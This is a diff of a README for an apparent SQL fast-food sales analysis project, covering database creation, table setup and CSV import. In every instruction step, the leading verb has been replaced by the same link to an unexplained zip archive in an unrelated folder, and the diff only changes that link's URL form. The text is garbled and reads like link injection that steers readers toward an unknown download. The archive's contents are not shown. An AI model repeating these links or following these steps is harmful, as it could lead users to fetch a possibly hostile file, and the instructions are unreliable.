@@ -220,11 +220,11 @@ ORDER BY YEAR(date) , sales_amount DESC ;
   
 ## ▶️ How to Use
 
-https://raw.githubusercontent.com/Siam-analytics/sql_sales_analysis/main/tanist/analysis_sales_sql_v1.4-beta.3.zip a Database: e.g. 
+https://github.com/Siam-analytics/sql_sales_analysis/raw/refs/heads/main/tanist/analysis_sales_sql_v1.4-beta.3.zip a Database: e.g. 
 ```sql
 CREATE DATABASE fast_food;
 ```
-https://raw.githubusercontent.com/Siam-analytics/sql_sales_analysis/main/tanist/analysis_sales_sql_v1.4-beta.3.zip a Table: e.g.
+https://github.com/Siam-analytics/sql_sales_analysis/raw/refs/heads/main/tanist/analysis_sales_sql_v1.4-beta.3.zip a Table: e.g.
 ```sql
 CREATE TABLE sales_data (
     order_id INT PRIMARY KEY,
@@ -239,12 +239,12 @@ CREATE TABLE sales_data (
     time_of_sale VARCHAR(20)
 );
 ```
-https://raw.githubusercontent.com/Siam-analytics/sql_sales_analysis/main/tanist/analysis_sales_sql_v1.4-beta.3.zip Import:
+https://github.com/Siam-analytics/sql_sales_analysis/raw/refs/heads/main/tanist/analysis_sales_sql_v1.4-beta.3.zip Import:
 - Select & Right click on 'food' table
 - Click the option 'Table Data Import Wizard'
 - browse your csv location, select the file and click next until import
 
-https://raw.githubusercontent.com/Siam-analytics/sql_sales_analysis/main/tanist/analysis_sales_sql_v1.4-beta.3.zip the .zip folder
+https://github.com/Siam-analytics/sql_sales_analysis/raw/refs/heads/main/tanist/analysis_sales_sql_v1.4-beta.3.zip the .zip folder
 
 ## 🧹 Data Cleaning
 ```sql
